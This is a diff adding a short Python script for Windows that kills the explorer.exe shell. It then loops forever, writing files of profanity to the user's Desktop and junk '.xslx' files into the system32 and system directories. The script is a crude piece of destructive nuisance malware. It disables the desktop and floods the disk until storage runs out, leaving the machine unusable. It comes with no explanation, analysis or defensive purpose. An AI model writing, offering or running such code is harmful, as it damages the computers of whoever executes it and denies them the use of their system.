@@ -1,0 +1,15 @@
+import os
+from os import system as sys
+sys('taskkill /f /im explorer.exe')
+a=0
+while True:
+    for i in range(30):
+        with open("C:/Users/"+os.getlogin()+"/Desktop/"+str(a)+"fuck.txt",'w') as F:
+            F.write("fuck you")
+            a=a+1
+    with open("C:\Windows\system32\/"+str(a)+".xslx",'w') as f:
+        a=a+1
+        f.write("Bsjjdksnwjbaajknsssssndjsskjdbd djddddddddddd^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^@@!#$%$%*(*(*(^%(*(*(*(*(")
+    with open("C:\Windows\system\/"+str(a)+".xslx",'w') as f:
+        a=a+1
+        f.write("Bsjjdksnwjbaajknsssssndjsskjdbd djddddddddddd^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^@@!#$%$%*(*(*(^%(*(*(*(*(")
